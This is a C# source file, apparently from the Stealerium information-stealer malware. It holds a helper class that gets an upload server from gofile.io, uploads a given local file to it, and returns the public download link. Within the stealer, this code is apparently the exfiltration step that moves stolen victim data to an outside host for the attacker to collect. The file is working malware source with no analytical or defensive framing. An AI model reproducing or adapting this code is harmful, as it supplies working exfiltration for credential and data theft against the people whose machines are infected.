using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.Json.Serialization;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Stealerium.Helpers
{
    internal sealed class GofileFileService
    {
        private const string ServiceEndpoint = "https://{server}.gofile.io/";

        public static string UploadFile(string file)
        {
            var client = new WebClient();
            var optimalServer = GetServer(client);

            var endpoint = ServiceEndpoint.Replace("{server}", optimalServer);


            var request =
                client.UploadFile(
                    endpoint +
                    "uploadFile",
                    file);

            var responseBody = Encoding.ASCII.GetString(request);
            var rawJson = JObject.Parse(responseBody);
            var d = JsonConvert.SerializeObject(rawJson);
            var output = JsonConvert.DeserializeObject<ApiResponse>(d);

            return output.Data["downloadPage"].ToString();
        }

        private static string GetServer(WebClient client)
        {
            var request = client.DownloadString(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer");
            var output = JObject.Parse(request);
            var d = JsonConvert.SerializeObject(output);
            var serverStatus = JsonConvert.DeserializeObject<ApiResponse>(d);

            if (!serverStatus.Status.Equals("ok"))
                throw new NotSupportedException($"FileService status returned a {serverStatus.Status} value.");

            return serverStatus.Data.First().Value?.ToString();
        }
    }

    /// <summary>
    /// Data class for the gofile.io api v2
    /// example: {"status":"ok","data":{"server":"store1"}}
    /// example: {"status":"ok","data":{"code":"123Abc","adminCode":"3ZcBq12nrYu4cbSwJVYY","file":{"name":"file.txt", [...]}}}
    /// </summary>
    public class ApiResponse
    {
        [JsonPropertyName("status")] public string Status { get; set; }

        [JsonPropertyName("data")] public Dictionary<string, object> Data { get; set; }
    }
}